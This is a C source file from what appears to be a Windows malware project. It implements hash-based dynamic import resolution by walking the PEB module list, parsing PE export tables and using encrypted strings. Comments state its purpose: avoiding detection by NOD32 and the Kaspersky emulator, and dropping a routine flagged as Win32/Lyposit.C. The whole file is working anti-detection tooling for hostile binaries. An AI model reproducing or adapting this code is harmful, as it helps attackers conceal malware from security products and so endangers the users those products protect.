/*
	DynImports.c
 Dynamic imports routines

*/

#include <windows.h>

#include "dbg.h"
#include "mem.h"
#include "CryptoStrings.h"
#include "HashedStrings.h"
#include "MyStringRoutines.h"
//#include "DelayedAssign.h"

#include "DynImports.h"


// globals for this module
diLibsState DIState;


/*
	Main initialization function
 Called internally only once per process
*/
BOOL bInitDynImports()
{
	BOOL bResult = FALSE;

	__try {

		// check if global struct is already inited
		if (DIState.wStructSize != sizeof(diLibsState) ) {

			// need to perform init
			memset(&DIState, 0, sizeof(diLibsState) );

			// prepare search path
			// .. - moved to first call of LoadLibraryByHash

			// init guard cs
			InitializeCriticalSection(&DIState.csGuard);

			// init done, save result
			DIState.wStructSize = sizeof(diLibsState);
			bResult = TRUE;

		}

	} __except(1) { DbgPrint("bInitDynImports: failed: exception catched\r\n");  } 

	return bResult;
}

/*
	Received wsz name of a file to be hashed,
 lowercases and hashes it.
	// NB: wszNameToHash is modified during this func <-- fixed
*/
UINT64 diHashName(LPWSTR wszNameToHashIn)
{
	LPSTR szNameToHash = NULL;
	UINT64 i64Res = 0;

	LPWSTR wszNameToHash = NULL;	// internal buffer

	__try {

		// alloc & copy
		wszNameToHash = (LPWSTR)my_alloc( (lstrlenW(wszNameToHashIn) + 2) * sizeof(WCHAR) );
		lstrcpyW(wszNameToHash, wszNameToHashIn);

		// lowercase source
		sr_lowercase(wszNameToHash);

		// translate into mbstring
		szNameToHash = (LPSTR)my_alloc(10240);
		WideCharToMultiByte(CP_ACP, 0, wszNameToHash, -1, szNameToHash, 10240, NULL, NULL);
		i64Res = HashStringA(szNameToHash);
		my_free(szNameToHash);

		my_free(wszNameToHash);

	} __except(1) { DbgPrint("failed: exception catched\r\n"); }

	return i64Res;

}

/*
	Scans loaded modules list and returns HMODULE to the one specified by i64Hash
*/
HMODULE GetModuleHandleByHash(UINT64 i64Hash)
{
	HMODULE hResult = NULL;

	 PPEB PebAddress;
	 PMY_PEB_LDR_DATA pLdr;
	 PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
	 PVOID pModuleBase;
	 PIMAGE_NT_HEADERS pNTHeader;
	 DWORD dwExportDirRVA;
	 PLIST_ENTRY pNextModule;
	 UNICODE_STRING BaseDllName;

	 WCHAR wDllNameBuff[128];
	 BYTE bDllNameCounter;

#if defined(_WIN64)
 PebAddress = (PPEB) __readgsqword( 0x60 );
#elif defined(_M_ARM)
 // I can assure you that this is not a mistake. The C compiler improperly emits the proper opcodes
 // necessary to get the PEB.Ldr address
 PebAddress = (PPEB) ( (ULONG_PTR) _MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
 __emit( 0x00006B1B );
#else
 PebAddress = (PPEB) __readfsdword( 0x30 );
#endif

 pLdr = (PMY_PEB_LDR_DATA)( ((PMY_PEB)PebAddress)->LoaderData );
 pNextModule = pLdr->InLoadOrderModuleList.Flink;
 pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;

 while (pDataTableEntry->DllBase != NULL)
 {
  //dwModuleHash = 0;
  pModuleBase = pDataTableEntry->DllBase;
  BaseDllName = pDataTableEntry->BaseDllName;
  pNTHeader = (PIMAGE_NT_HEADERS) ((ULONG_PTR) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)->e_lfanew);
  dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

  // Get the next loaded module entry
  pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry->InLoadOrderLinks.Flink;

  // If the current module does not export any functions, move on to the next module.
  if (dwExportDirRVA == 0) { continue; }

  // copy name to internal buffer and lowercase it
  bDllNameCounter = 0;
  while ((bDllNameCounter < 127) && ( *(WORD *)( (SIZE_T)BaseDllName.Buffer + (bDllNameCounter*2)) != 0x00 )) {
	wDllNameBuff[bDllNameCounter] = *(WORD *)( (SIZE_T)BaseDllName.Buffer + (bDllNameCounter*2));
	if ((wDllNameBuff[bDllNameCounter] >= 'A') && (wDllNameBuff[bDllNameCounter] <= 'Z')) { wDllNameBuff[bDllNameCounter] =(WCHAR)( (WORD)wDllNameBuff[bDllNameCounter] + 32 ); }
	bDllNameCounter++;
  }
	wDllNameBuff[bDllNameCounter] = 0x0;	// null terminator

  if ( HashStringW((LPCWSTR)wDllNameBuff) == i64Hash) {

	  // module name found, 
	  return (HMODULE)pModuleBase;

  } // if module name's hash found 

 } // while enum all the modules from PEB.Ldr

 // All modules have been exhausted and the function was not found.
 return NULL;
}


// NB: NOD32 detects this routine as Win32/Lyposit.C, so it should be avoided
// seeks and loads a library by the hash of it's name
// NB: hash name should include the extension too in order to allow load of non-dll filenames
// this func searches system32 folder
/*
HMODULE LoadLibraryByHash(UINT64 i64Hash, BOOL bMemLoadDependencies, BOOL bCallDllMain)
{
	HMODULE hResult = NULL;

	// buffers
	LPWSTR wszSystemDir = NULL;
	LPWSTR wszSystemPath = NULL;
	UINT lLen = 0;

	// decrypt buff
	LPWSTR wszS = NULL;

	// FindFirstFile buffs
	WIN32_FIND_DATA fdFind;
	HANDLE hFind;


	__try {

		// check if init done on struct
		bInitDynImports();

		DbgPrint("i64Hash=%08x%08x\r\n", (DWORD)(i64Hash >> 32), (DWORD)i64Hash);

		// to prevent multiple inits
		EnterCriticalSection(&DIState.csGuard);
 
		// check if DIState.wszSystemDllSeekMask inited
		if (!DIState.wszSystemDllSeekMask) {

			// determine system dlls directory
			lLen = (MAX_PATH+1) * 2;
			wszSystemDir = (LPWSTR)my_alloc(lLen);
			if (GetSystemDirectory(wszSystemDir, lLen - 2)) {

				DbgPrint("wszSystemDir=[%ws]\r\n", wszSystemDir); // c:\windows\system32' 

				// decrypt and append seek pattern
				wszS = CRSTRW("\\*.*", "\xff\x1f\x68\x0a\xfb\x1f\x54\x48\xa1\x4d\xb7");
				lstrcat(wszSystemDir, wszS);
				my_free(wszS);

				// make only dir from seek path (needed to pass to some funcs later)
				wszSystemPath = (LPWSTR)my_alloc(lLen);
				lstrcpyn(wszSystemPath, wszSystemDir, lstrlen(wszSystemDir) - 2);
				DbgPrint("wszSystemPath=[%ws]\r\n", wszSystemPath);

				// save ptr
				DIState.wszSystemDllSeekMask = wszSystemDir;
				DIState.wszSystemDllPath = wszSystemPath;


			} // sys dir got

			// do not free mem - it will be used later by other calls
			//my_free(wszSystemDir);

		} // !DIState.wszSystemDllSeekMask

		LeaveCriticalSection(&DIState.csGuard);

		// if init done - proceed next
		if (DIState.wszSystemDllSeekMask) {

			DbgPrint("DIState.wszSystemDllSeekMask=[%ws]\r\n", DIState.wszSystemDllSeekMask);

			// seek for all files there
			hFind = FindFirstFile(DIState.wszSystemDllSeekMask, &fdFind);
			if (INVALID_HANDLE_VALUE != hFind) {

				do {

					// check for not a dir
					if (!(fdFind.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {

						// proceed result
						if (diHashName((LPWSTR)&fdFind.cFileName) == i64Hash) {
							
							// found a match, use & load it
							DbgPrint("match fname=[%ws]\r\n", &fdFind.cFileName);
							
								// read file contents and load lib
								#ifdef USE_MEMORY_MODULE_LOAD
									hResult = MemoryLoadLibraryFromFile(DIState.wszSystemDllPath, (LPWSTR)&fdFind.cFileName, NULL, bMemLoadDependencies, NULL, bCallDllMain);
								#else
									// usual load
									// NB: if process is catched at ExitProcess, this call may hang forever. To prevent such 
									// behaviour, attempt to load needed libs as soon as possible at installer.
						//	if (!(hResult=GetModuleHandle((LPWSTR)&fdFind.cFileName))) { hResult=LoadLibrary((LPWSTR)&fdFind.cFileName); }
									hResult=LoadLibrary((LPWSTR)&fdFind.cFileName);
								#endif
							DbgPrint("hResult=%04Xh\r\n", hResult);

							// exit loop
							break;

						} // match found

					} // not a dir

				} while (FindNextFile(hFind, &fdFind));

				// free resources
				FindClose(hFind);

			} // seek started


		} // DIState.wszSystemDllSeekMask

		

	} __except(1) { DbgPrint("WARN: exception catched\r\n"); LeaveCriticalSection(&DIState.csGuard);  }

	return hResult;

}*/

LPWSTR diGetSystemDllsPath()
{
	// check if init done on struct
	bInitDynImports();

	return DIState.wszSystemDllPath;

}


/*
	Performs enumeration of all imports and passed it's name&addr to callback function
*/
BOOL diEnumExports(HMODULE hLib, PDI_ENUM_EXPORTS_CALLBACK pEnumFunc, LPVOID pParameter)
{
	BOOL bResult = FALSE; // func res

	// pe parsing headers
	PIMAGE_NT_HEADERS header;
	PIMAGE_EXPORT_DIRECTORY exports;
	LPVOID names, addrs, ords;
	WORD ord;

	// single selected addr
	LPSTR szExportName;
	LPVOID pFuncAddr;

	DWORD i;

	__try {

		// parse a single lib
		if ( IMAGE_DOS_SIGNATURE != ((PIMAGE_DOS_HEADER)hLib)->e_magic ) { DbgPrint("lib fail: e_magic != IMAGE_DOS_SIGNATURE \r\n"); return bResult; } 
		header = (PIMAGE_NT_HEADERS)( (BYTE *)hLib + ((PIMAGE_DOS_HEADER)hLib)->e_lfanew);

		if (IMAGE_NT_SIGNATURE != header->Signature) { DbgPrint("lib fail: header->Signature != IMAGE_NT_SIGNATURE\r\n"); return bResult; }
		if (header->OptionalHeader.NumberOfRvaAndSizes == 0) { DbgPrint("lib fail: header->OptionalHeader.NumberOfRvaAndSizes is 0\r\n"); return bResult; }

		exports = (PIMAGE_EXPORT_DIRECTORY)( (BYTE *)hLib + header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
		names = (PVOID)( (BYTE *)hLib + exports->AddressOfNames );
		ords = (PVOID)( (BYTE *)hLib + exports->AddressOfNameOrdinals );
		addrs = (PVOID)( (BYTE *)hLib + exports->AddressOfFunctions );

		for (i=0; i < exports->NumberOfNames; i++) {

			szExportName = (LPSTR)( (BYTE *)hLib + ((DWORD *)names)[i] );

			/*
					TODO: forwards parse
					 check if passed result is inside of export table to detect forwarded functions like 'NTDLL.RtlEnterCriticalSection'
					 they should be parsed specially
			*/

				ord = (  ((WORD *)ords)[i] );
				pFuncAddr = (LPVOID)( (BYTE *)hLib + ((DWORD *)addrs)[ord] );

				// call callback and exit if it wants
				if (!pEnumFunc(szExportName, pFuncAddr, pParameter)) { break; }

		} // for

	} __except(1) { DbgPrint("WARN: exception catched\r\n"); }

	return bResult;

}


/*
	NB: x32 target only
	TO-DO: rewrite it to use diEnumExports()
*/
BOOL diLoadAPI(HMODULE hLib, UINT64 i64Hash, LPVOID *pStorePlace)
{
	BOOL bResult = FALSE; // func res

	// pe parsing headers
	PIMAGE_NT_HEADERS header;
	PIMAGE_EXPORT_DIRECTORY exports;
	LPVOID names, addrs, ords;
	WORD ord;

	// single selected addr
	LPSTR szExportName;
	LPVOID pFuncAddr;

	DWORD i;

	__try {

		// parse a single lib
		if ( IMAGE_DOS_SIGNATURE != ((PIMAGE_DOS_HEADER)hLib)->e_magic ) { DbgPrint("lib fail: e_magic != IMAGE_DOS_SIGNATURE \r\n"); return bResult; } 
		header = (PIMAGE_NT_HEADERS)( (BYTE *)hLib + ((PIMAGE_DOS_HEADER)hLib)->e_lfanew);

		if (IMAGE_NT_SIGNATURE != header->Signature) { DbgPrint("lib fail: header->Signature != IMAGE_NT_SIGNATURE\r\n"); return bResult; }
		if (header->OptionalHeader.NumberOfRvaAndSizes == 0) { DbgPrint("lib fail: header->OptionalHeader.NumberOfRvaAndSizes is 0\r\n"); return bResult; }

		exports = (PIMAGE_EXPORT_DIRECTORY)( (BYTE *)hLib + header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
		names = (PVOID)( (BYTE *)hLib + exports->AddressOfNames );
		ords = (PVOID)( (BYTE *)hLib + exports->AddressOfNameOrdinals );
		addrs = (PVOID)( (BYTE *)hLib + exports->AddressOfFunctions );

		for (i=0; i < exports->NumberOfNames; i++) {

			szExportName = (LPSTR)( (BYTE *)hLib + ((DWORD *)names)[i] );

			// hash export and check it against input hash
			if (HashStringA(szExportName) == i64Hash ) {

				ord = (  ((WORD *)ords)[i] );
				pFuncAddr = (LPVOID)( (BYTE *)hLib + ((DWORD *)addrs)[ord] );
		
				//DbgPrint("Export found for %08x%08x: %s at %04Xh\r\n", (DWORD)( i64Hash >> 32 ), (DWORD)(i64Hash), szExportName, pFuncAddr );

				/*
					TODO: forwards parse
					 check if passed result is inside of export table to detect forwarded functions like 'NTDLL.RtlEnterCriticalSection'
					 they should be parsed specially
				*/
				//if (pFuncAddr > exports) && (pFuncAddr < exports-> )

				// place func addr
				*pStorePlace = pFuncAddr;	// kis emulator stops if we remove this assignment
				//daAddAssignment(pStorePlace, pFuncAddr);


				bResult = TRUE;

				break;

			} // hash found

		} // for

		if (!bResult) { DbgPrint("WARN: FAILED TO FIND BY HASH"); }

	} __except(1) { DbgPrint("WARN: exception catched\r\n"); }

	return bResult;
}


/*
	Loads a list of APIs specified by UINT constant and places it at (FARPROC) ptr 
 at the passed structure sequentaly
*/
BOOL LoadAPIs(HMODULE hLib, PUINT64 pi64HashesArray, UINT iElementsCount, LPVOID pStorePtrsArray)
{
	BOOL bResult = FALSE; // func res
	UINT i;	// counter
	UINT64 *pi64Hash;	// selected hash value
	LPVOID *pStorePtr;	// ptr to store found proc addrs

	__try {

		DbgPrint("pi64HashesArray=%08Xh iElementsCount=%u pStorePtrsArray=%08Xh\r\n", pi64HashesArray, iElementsCount, pStorePtrsArray);

		// init delayed assigner
		//daInitRoutines();

		// enum all the element in hashes table
			pi64Hash = pi64HashesArray;
			pStorePtr = (LPVOID *)pStorePtrsArray;
		for (i=0; i<iElementsCount; i++ ) {

			DbgPrint("step %u hash %08x%08x h\r\n", i, (DWORD)(*pi64Hash >> 32), (DWORD)(*pi64Hash) );

			// load a single api by it's hash
			if (!diLoadAPI(hLib, *pi64Hash, pStorePtr)) { DbgPrint("CRIT WARN: api not found: hLib=%04Xh el_id=%u hash=%08x%08xh\r\n", hLib, i+1, (DWORD)(*pi64Hash << 32), (DWORD)(*pi64Hash) ); }

			// step to next elements
			pi64Hash++;
			pStorePtr++;

		} // for


		// wait until all done
		//daWaitUntilAllDone();

	} __except(1) { DbgPrint("WARN: exception catched\r\n");  }

	return bResult;
}